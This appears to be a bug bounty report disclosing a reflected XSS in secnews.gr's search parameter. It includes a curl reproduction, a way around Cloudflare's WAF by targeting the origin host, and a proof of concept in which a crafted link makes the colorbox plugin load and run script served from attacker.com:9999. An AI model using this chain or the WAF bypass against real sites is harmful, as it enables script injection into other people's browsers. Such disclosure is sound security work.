    "vulnerability_information": "Overview\n===\nSearch query is inserted into the HTML of the page without proper encoding. Specifically, a single-quote is not html-encoded (albeit escaped, even twice), which allows the attacker to break out of the HTML attribute and inject arbitrary tags.\n\n```html\ncurl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o \".{47}?<test>.*?>\"\n<div id=\"content\" data-currentquery='{\"s\":\"\\\\'><test><\"}' class=\"main-content articles list sidebar-right    non-full\">\n```\n\nImpediments\n===\nAlthough aformentioned injection point can be used to carry out XSS attacks, there is a couple of complications.\n\n1. The website is protected by the CloudFlare WAF which blocks any suspicious requests. This can be circumvented though by instead targeting `secnews.wpengine.com`.\n2. The website has `X-XSS-Protection` header set which enables very powerful XSS Auditor in Google Chrome.\n3. The potential victim is administrator on a web security website. They are likely to have some kind of an XSS protection plugin installed in their browser.\n\nSolution\n===\nOne of the javascript plugins (colorbox) used by the website has a code path that inserts response from arbitrary URL into DOM tree. It allows the attacker to go from regular XSS to DOM based XSS that anti-XSS tools are not able to detect.\n\nSee a proof-of-concept video: F119742\n\n1. The attacker lures the victim to visit this link:\n    ```\n    https://www.secnews.gr/?s=%27%20class%3Dcolorbox%20href=/attacker.com:9999%3E\n    ```\n\n2. To any incoming requests the server at `attacker.com:9999` responds with:\n    ```\n    HTTP/1.1 200 OK\n    content-length: 39\n    access-control-allow-origin: *\n    access-control-allow-headers: x-requested-with\n    \n    <script>alert(document.domain)</script>\n    ```\n\n3. The victim clicks anywhere below the navigation bar.\n4. Malicious script gets downloaded and executed.\n\nSecurity Implications\n===\nAlthough this exploit requires the victim to click, I'm confident (and hope you are too) that it's only a question of time and effort to find a code path that executes injected script without user interaction.\n\nYou mention in the policy that you don't consider any XSS significant enough for bounty. Although I think that you underestimate the power of XSS, it's your call and I've had a lot of fun anyway.\n\n\n\n",
